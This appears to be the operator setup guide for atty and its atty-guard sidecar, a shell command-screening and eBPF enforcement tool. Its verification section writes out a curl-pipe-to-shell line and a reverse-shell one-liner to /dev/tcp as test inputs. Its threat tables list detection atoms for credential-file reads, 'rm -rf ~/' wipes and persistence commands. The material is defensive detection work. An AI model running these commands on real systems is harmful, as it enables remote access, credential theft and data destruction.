---
layout: default
title: Operator workflow
permalink: /operator-workflow/
---

# Operator workflow — getting atty + atty-guard fully wired

End-to-end setup for the security stack: install the sidecar daemon →
download the atom corpus → opt into eBPF (optional) → verify with
`atty doctor`.

If you only want the in-proc Tier-1 pattern matcher (no daemon, no
kernel hooks), you can stop after `atty init <shell>` — everything
below is opt-in. The in-proc matcher catches `curl … | sh`,
`npm install <flagged>`, and `bash -c "<long-base64>"` shapes
without any extra setup.

The "full" path adds:

- **atty-guard** sidecar — UDS daemon, Tier-2 backend (stub /
  heuristic / ONNX BERT / ONNX Qwen-Coder), V2-J multi-hit
  accumulator + V2-J-2 auto-Block, V2-F live OSV.dev lookups.
- **Atom corpus** — IOC strings pulled from GTFOBins / SigmaHQ /
  LOLBAS, refreshed on a cron.
- **eBPF kernel hooks** — V2-B kernel-side enforcement
  (`bprm_check_security` LSM hook + `execve` tracepoint) so even
  a non-atty shell can't run a Block-verdict command via this
  PID tree.
- **`atty doctor`** — chain verifier; tells you which links are
  still missing and what to do about each.

## 1. Install atty (host)

```sh
git clone https://github.com/fentas/atty
cd atty
make install        # atty binary → $PREFIX/bin/atty (default ~/.local/bin)
                    # AND atty-guard installer (next section)
```

`make install` is the meta target — it ALSO installs the atty-guard
sidecar via `contrib/install.sh`. To install only atty:

```sh
make install-atty
```

The shell integration eval (gives you OSC 133 prompt markers — needed
for dialog/auto LLM mode and the trust-cache):

```sh
echo 'eval "$(atty init bash)"' >> ~/.bashrc   # bash
# or
echo 'eval "$(atty init zsh)"' >> ~/.zshrc     # zsh
```

Start a new shell. Verify integration:

```sh
eval "$(atty doctor)"
```

The OSC 133 section should be all green. If anything's red, the
inline hint usually points at "your `.bashrc` reset `PROMPT_COMMAND`
after our init eval ran" or similar.

## 2. Install atty-guard (sidecar)

```sh
sudo make install-guard
```

atty-guard is a SYSTEM daemon (post-#140) — installed and run under
a dedicated `atty` user/group, NOT as systemd-user. WHY: atom files
and URL trust state influence detection. A user-writable trust file
is a DOS vector — a malicious process running as $USER could poison
the atom corpus with common-command atoms (`ls`, `cd`, ` `), every
keystroke fires Block, user disables atty-guard to regain a usable
shell, defense gone. atty:atty-owned files in `/var/lib/atty-guard/`
keep detection state outside the user's write reach.

What this does:

1. Builds `atty-guard/target/release/atty-guard` with the default
   feature set: `tier2-onnx`, `osv-live`, `atoms-fetch`. eBPF is
   opt-in — see §4 below.
2. Creates a system `atty` user/group (no home, no login shell).
3. Installs the binary to `/usr/local/bin/atty-guard`.
4. Drops `atty-guard.service` into `/etc/systemd/system/`.
5. Creates `/var/lib/atty-guard/` owned `atty:atty` mode 0750.
6. Runs `systemctl daemon-reload && enable --now`. The daemon
   binds `/run/atty-guard/atty-guard.sock` (the unit's
   `RuntimeDirectory=` creates that path owned `atty:atty 0750`).

Then add your user to the `atty` group so atty proxies can connect:

```sh
sudo usermod -aG atty $USER
# log out + back in (or `newgrp atty` for a single shell)
```

To wire atty's `security_guard` module to the daemon socket, edit
`src/config.zig`:

```zig
pub const modules = .{
    atty.modules.security_guard.configure(.{
        .enabled = true,
        // System-daemon path — the systemd unit's
        // RuntimeDirectory=atty-guard creates this with the right
        // perms. User must be in the `atty` group to connect.
        .daemon_socket_path = "/run/atty-guard/atty-guard.sock",
    }),
};
```

Then rebuild atty (`make build-atty`) and `make link-atty` so the
new binary picks up the wired path.

### Migrating from a pre-#140 systemd-user install

If you previously installed atty-guard as systemd-user (the binary
lived at `~/.local/bin/atty-guard`, unit at
`~/.config/systemd/user/atty-guard.service`), `atty doctor` will
detect that install and prompt you to migrate. Tear it down before
installing the system daemon:

```sh
systemctl --user disable --now atty-guard.service
rm -f ~/.local/bin/atty-guard
rm -f ~/.config/systemd/user/atty-guard.service
rm -rf ~/.config/systemd/user/atty-guard.service.d
systemctl --user daemon-reload
```

Then `sudo make install-guard` for the new system daemon.

## 3. Atom corpus + user trust state

**System corpus** — atty-guard ships with a hand-curated atom set
baked into the binary at compile time (`include_str!` of
`src/modules/security_guard/data/flagged_atoms.txt`). This is the
always-on baseline; updates ride atty's release cadence.
`atty-guard atoms list --system` prints it.

**User overlay** (post-#141) — operators can add per-user atoms via
the mediated CLI. The user overlay is stored under
`/var/lib/atty-guard/users/<uid>/atoms.user.txt` (`atty:atty` mode
0640) and is applied as a substring scan on top of the system
corpus at classify time. A hit upgrades a Safe verdict to Warn at
0.6 confidence (same shape as a bundled-atom hit).

Mutate the overlay through the daemon:

```sh
# Add an atom (sudo required — daemon enforces via SO_PEERCRED).
sudo atty-guard atoms add 'my-internal-tool --insecure-flag'

# Remove an atom.
sudo atty-guard atoms remove 'my-internal-tool --insecure-flag'

# List atoms by scope (defaults to --user).
atty-guard atoms list                # user overlay (no sudo)
atty-guard atoms list --system       # bundled corpus
atty-guard atoms list --session      # ephemeral in-memory overlay
```

**URL decisions** — same pattern, separate file
(`urls.decisions.txt`). Records `allow <host>` / `block <host>`
entries. The runtime trust flow that promotes prompt taps into the
session (`[A]llow always` / `[B]lock host forever`) lands in
PR #142; the CLI surface here works today:

```sh
sudo atty-guard urls allow brew.sh
sudo atty-guard urls block evil.io
atty-guard urls list
```

**Session** — in-memory state that builds up over the lifetime of
the atty-guard daemon process (NOT a single atty proxy session —
multiple atty proxies under the same UID share one daemon-side
session). Populated EXCLUSIVELY via inline keystrokes on the
security_guard banner. `sudo atty-guard atoms add ...` writes to
the PERSISTENT overlay, not the session.

```
atty security_guard: <reason>
        match: <substring>
        [y]es once · [a]llow always · [t]rust permanently · [B]lock host forever · any other key cancels.
```

| Key | Effect |
|---|---|
| `[y]` | run this one command, nothing remembered |
| `[a]llow always` | session-trust the (category, matched) hash — won't re-prompt until atty exits. Mirrored to daemon for `atty-guard session list` visibility. |
| `[t]rust permanently` | atty proxy adds to its in-memory trust cache for the current session AND mirrors to the daemon's per-UID `commands.trusted.txt` via `TrustAdd`. The daemon copy is the persistent store; `atty-guard trust list` shows it; subsequent atty sessions seed `rt.trust` from the daemon at first Enter. |
| `[B]lock host forever` | extract host from the matched URL, add to session-block list. Future commands containing that host get REFUSED outright (red line + readline cleared). Mirrored to daemon. Cancels the current command too. Falls through to `[cancel]` when the match has no URL host. |
| any other | cancel — Ctrl+U clears readline, nothing remembered |

`[a]` / `[B]` decisions are SESSION-only — they live in atty's
runtime memory + the daemon's per-UID session state. They evaporate
when atty exits. To persist them across atty restarts:

```sh
atty-guard session list      # show pending in-memory decisions
atty-guard session clear     # discard them
sudo atty-guard session write # persist them to the user files
```

`session write` is the ONLY session op that needs sudo — the others
only touch ephemeral daemon state.

**WHY sudo for mutations:** a process running as `$USER` could
otherwise poison the user overlay with common-command atoms (`ls`,
`cd`, ` `) — every keystroke fires Warn/Block, user disables
atty-guard to regain a usable shell, detection gone. Requiring sudo
keeps mutations behind admin intent, even when the entry is a
"user's personal preference" addition.

**Which UID owns the change?** When you invoke `sudo atty-guard
atoms add ...`, the CLI reads the `SUDO_UID` env var (sudo sets it
to the invoking user's UID) and forwards it to the daemon. The
daemon writes into `/var/lib/atty-guard/users/$SUDO_UID/`, NOT
`users/0/`. Your personal overlay stays under your UID even though
the write happens as root. To manage another user's overlay
(operator-on-behalf-of), invoke as that user instead:

```sh
sudo -u alice atty-guard atoms add 'alice-only atom'
# alice's session: SUDO_UID=<alice-uid>, write lands under users/<alice-uid>/
```

Direct root login (no sudo, no SUDO_UID set) writes into
`users/0/` — atty doesn't run as root in normal use, so this only
matters for admin scripts. Non-root callers cannot target a UID
other than their own (the daemon rejects the request).

### System-fetched corpus refresh (operator-side)

The daemon can pull fresh IOC atoms from upstream sources
(GTFOBins, Sigma's `/rules/linux/**`) on a schedule. The output
lands at `/var/lib/atty-guard/atoms.system.txt` (atty:atty 0640)
and feeds the classify hot path alongside the bundled corpus +
the per-UID user overlay.

**Manual one-shot refresh:**

```sh
sudo -u atty /usr/local/bin/atty-guard --update-atoms-now
sudo systemctl restart atty-guard.service
```

First command runs the fetcher synchronously as the `atty` user
(so the output file lands atty-owned). Second command restarts
the daemon so the new file gets re-loaded at startup — the
running daemon's in-memory copy is a one-shot lazy load and won't
re-read mid-life. The cron path below avoids the restart because
the cron thread calls the explicit `reload_system_fetched` after
each successful fetch.

**Scheduled refresh via systemd:**

Drop in `/etc/systemd/system/atty-guard.service.d/refresh.conf`:

```
[Service]
ExecStart=
ExecStart=/usr/local/bin/atty-guard --atoms-update-interval 7d
```

Then `sudo systemctl daemon-reload && sudo systemctl restart
atty-guard`. The daemon spawns a background thread that re-runs
the fetch every interval; failed fetches log + continue (no fail-
open). After each successful fetch the daemon's in-memory copy is
hot-reloaded — no restart needed.

**Permission gate**: at every load (startup + post-fetch), the
daemon checks that `atoms.system.txt` is owned by the `atty` user
and is NOT group-writable or world-writable. On drift, the load
is refused with a journald warning and the previous in-memory
state is kept (fail-safe). A poisoned corpus could otherwise
escalate via V2-J to Block-via-eBPF and DOS the user's whole PID
tree.

Sources fetched: `gtfobins` (~357 atoms after filter) and `sigma`
(`/rules/linux/**` only, ~369 atoms). LOLBAS was dropped because
it's Windows-native by definition. Placeholder atoms (Sigma's
`/path/to/`, `{PATH:.exe}`, angle-bracket `<hostname>` shapes) are
filtered at extract time because Aho-Corasick has no wildcards —
they'd never match real input.

### Pre-release bundled corpus refresh (maintainer-side)

The compile-time bundled corpus
(`src/modules/security_guard/data/flagged_atoms.txt` in the repo)
is refreshed by maintainers — run the system fetcher, review the
diff, commit. Operators receive the new baseline via the next
atty release; the system-fetched corpus above is the runtime path
for in-between updates.

## 4. Enable eBPF (optional, opt-in)

eBPF kernel hooks (V2-B) give you kernel-side enforcement: even if
the user works around atty entirely (e.g. via SSH from another
session), a Block-verdict-marked PID tree can't `execve()`. Without
eBPF you still get atty-side refusal (red REFUSED line + Ctrl+U
readline clear) but the kernel doesn't know about it.

Build + install with eBPF in one step:

```sh
sudo make install-guard GUARD_FEATURES=tier2-onnx,osv-live,atoms-fetch,ebpf
```

Requires `libbpf-dev` on the build host. The `install-guard` target
detects `ebpf` in `GUARD_FEATURES` and passes `--with-ebpf` to
`contrib/install.sh`, which:

1. Verifies the binary actually has the feature compiled in (via
   `atty-guard --print-features`).
2. Drops in `/etc/systemd/system/atty-guard.service.d/ebpf.conf`
   with `AmbientCapabilities=CAP_BPF CAP_PERFMON`,
   `SystemCallFilter=bpf perf_event_open` (widens the baseline
   `@system-service` filter — both syscalls live in `@privileged`),
   `RestrictNamespaces=` (clears the namespace lockout that blocks
   some BPF map types), and `ExecStart=/usr/local/bin/atty-guard
   --enable-ebpf`.
3. Reloads + restarts the daemon.

To disable eBPF later without rebuilding, remove the drop-in:

```sh
sudo rm -f /etc/systemd/system/atty-guard.service.d/ebpf.conf
sudo systemctl daemon-reload
sudo systemctl restart atty-guard
```

Verify the kernel programs attached:

```sh
sudo journalctl -u atty-guard -n 50 | grep eBPF
# Expected: "atty-guard: eBPF attached (LSM + execve tracepoint)"
# If you see "atty-guard: eBPF unavailable — <reason>" the daemon
# fell back to V2-A in-memory threat-map mode.
```

Or run `atty doctor` — its eBPF check now reads `--print-features`
+ inspects the unit's `ExecStart` (via `systemctl show -p
ExecStart`) and reports one of: feature missing / compiled but not
configured / compiled + configured + journald confirms "attached" /
compiled + configured but journald shows no attach (look for
the actual error in the operator's preferred journalctl form).

Common failure: kernel doesn't ship LSM BPF hooks. Most distros do
since 5.7; check `cat /sys/kernel/security/lsm` for `bpf` in the
list. If absent, your kernel was built without `CONFIG_BPF_LSM=y`.

## 5. Verify with `atty doctor`

```sh
eval "$(atty doctor)"
```

You should now see TWO sections:

```
atty doctor — OSC 133 integration
  ✓  inside atty session ($ATTY set)
  ✓  shell: bash 5.3.x
  ✓  __atty_osc133_d function defined
  ...

atty doctor — atty-guard sidecar
  ✓  atty-guard binary present (/usr/local/bin/atty-guard)
  ✓  atty-guard.service unit installed
  ✓  atty-guard.service is active
  ✓  UDS socket reachable (/run/atty-guard/atty-guard.sock)
  ✓  user is in `atty` group (can connect to the daemon socket)
  ✓  eBPF feature: compiled in — `sudo journalctl -u atty-guard | grep -i ebpf` shows "eBPF attached" once the unit has `--enable-ebpf` ExecStart + CAP_BPF + SystemCallFilter widening.
```

The eBPF line surfaces whether the running daemon binary was
COMPILED with the `ebpf` Cargo feature (definitive — uses
`atty-guard --print-features` introduced in issue #145, which
emits one feature per line based on `#[cfg(feature = ...)]`).
Whether the kernel-side hooks are actually ATTACHED is a separate
question — doctor doesn't probe `/sys/fs/bpf` (too noisy for a
shell snippet); the hint points at `journalctl -u atty-guard | grep
ebpf` for that. The atom corpus isn't checked here either —
atty-guard reads its corpus at compile time via `include_str!`,
there's no runtime file to verify.

The atty-guard section is **silent** when there's no evidence the
operator intended to install the sidecar (no binary AND no unit
file). Fresh atty installs without `make install-guard` won't see
the section at all — no spurious red ✗s.

## Verification — try an actual flagged command

In an atty session:

```sh
curl https://example.com/install.sh | sh
```

Expected:

```
atty security_guard: 1 signal fired: curl_pipe_sh — remote-fetch-and-execute
        match: curl https://example.com/install.sh | sh
        [y]es once · [t]rust permanently · any other key cancels.
```

Press `y` (allow once), `t` (trust permanently — mirrors to the
daemon's per-UID `/var/lib/atty-guard/users/<uid>/commands.trusted.txt`
via `TrustAdd`; the in-memory cache picks it up immediately for the
current session and subsequent atty sessions seed from the daemon
at first Enter), or any other key (Ctrl+U, readline cleared).
Banner also shows `[a]llow always` (session-only trust) and
`[B]lock host forever` (session-only host block) — see the Session
section above.

With `[accumulator] block_threshold` set in
`~/.config/atty-guard/config.toml` (or wherever `--config` points
the daemon), multi-hit commands escalate to outright refusal:

```sh
bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x
```

Expected (instead of the banner):

```
atty security_guard: REFUSED — 4 signals fired: AtomMatcher flagged `bash -i >&`; ...
        match: chmod +s
```

The line is cleared, no prompt — kernel-side eBPF (if enabled) ALSO
refuses the `execve` if the user shells out without atty.

## Removing it

`sudo make install-guard` writes the system daemon's binary + unit +
state dir + creates the `atty` user. `make unlink-guard` only unlinks
dev-mode symlinks from `make link-guard`. Full removal:

```sh
# Stop + disable the service.
sudo systemctl disable --now atty-guard.service

# Remove the installed paths.
sudo rm -f /usr/local/bin/atty-guard
sudo rm -f /etc/systemd/system/atty-guard.service
sudo rm -rf /etc/systemd/system/atty-guard.service.d
sudo rm -rf /var/lib/atty-guard
sudo systemctl daemon-reload

# Optional: remove the dedicated user/group.
sudo userdel atty 2>/dev/null || true
sudo groupdel atty 2>/dev/null || true

# Optional: clear user-side atty cache (ghost-text history, etc.).
rm -rf ~/.cache/atty
```

(If you used `make link-guard` for dev-mode, `make unlink-guard`
DOES handle the symlink — it only refuses on real-file installs.)

All trust state lives daemon-side in `/var/lib/atty-guard/` and
gets removed by `rm -rf /var/lib/atty-guard` above; no separate
user-side trust file to clean up.

## Named threats — what this stack catches

Two recent high-impact threats and how each layer detects them.
Drilled by `tests/integration/scenarios/exploit_*.sh` so a release
that broke detection would fail the integration suite.

### copy.fail (CVE-2026-31431) — kernel LPE via AF_ALG / splice()

Kernel page-cache memory-corruption primitive that turns an
unprivileged user into root (and breaks out of containers, since
the page cache is host-shared). Disclosed April 2026.

| Layer | Signal |
|---|---|
| Tier-1 AtomMatcher | `socket.AF_ALG`, `af_alg_set`, `algif_aead` — atoms in `flagged_atoms.txt`. Catches the C/Python PoC's command lines: anyone running a compiled exploit usually types something like `gcc poc.c -o exploit && ./exploit`. (`splice(` is intentionally omitted — it has too many legit uses in zero-copy I/O; the eBPF correlator below catches AF_ALG + splice at the syscall layer where the FP rate is near zero.) |
| eBPF AF_ALG tracepoint (V2-G, opt-in) | Kernel-side `sys_enter_socket` filter; flags ANY process that opens an AF_ALG socket — even if the user runs an opaque binary that never mentions the algorithm by name. Requires `--features ebpf` + CAP_BPF. |

### Shai-Hulud worm — npm/PyPI supply-chain malware

Worm that hijacks compromised developer credentials, propagates via
republishes, and installs a 60-second-polling dead-man-switch daemon
that fires `rm -rf ~/` if the stolen tokens get revoked. Active
waves: Sep 2025 (npm), Dec 2025 (npm + CI/CD), May 2026 (npm + PyPI
via GitHub Actions cache poisoning).

| Stage | Detection |
|---|---|
| Initial install | `npm install <flagged>` — V2-F live OSV.dev lookup + `flagged_npm.txt`. Caught at the prompt before bash runs the postinstall. |
| Dead-man switch | `rm -rf ~/`, `rm -rf $HOME`, `rm -rf ${HOME}`, `rm -rf /home/<user>` — all four canonical forms ship as atoms. |
| Credential harvest | `~/.aws/credentials`, `~/.npmrc`, `~/.ssh/id_{rsa,ed25519,ecdsa}`, `/proc/self/mem` — atoms cover file-read shapes and the self-scrape memory variant. Cross-process `/proc/<pid>/mem` reads aren't an atom (Aho-Corasick has no wildcards); eBPF V2-G's `openat()` tracepoint catches them at the kernel layer. |
| systemd persistence | `systemctl --user enable`, `systemctl --user daemon-reload`, `loginctl enable-linger` — atoms catch each step of the daemon-install command sequence. |
| V2-J auto-Block (opt-in) | With `[accumulator] block_threshold = 0.95`, multi-hit Shai-Hulud command chains (dead-man + credential read + persistence in one line) escalate from Warn to outright REFUSED. |

## See also

- `docs/security-guard-design.md` — full design rationale + V2-* tier table.
- `docs/security-guard-updates.md` — V2-F bundle format design (future).
- `docs/security-guard-slm.md` — Tier-2 ONNX SLM details (model choice, calibration).
- `docs/modules.md` — atty's module framework, including the `security_guard` module's config knobs.
- `atty-guard/ebpf/README.md` — kernel-side build details.
- `tests/integration/README.md` — end-to-end integration scenarios + probe.sh validator.
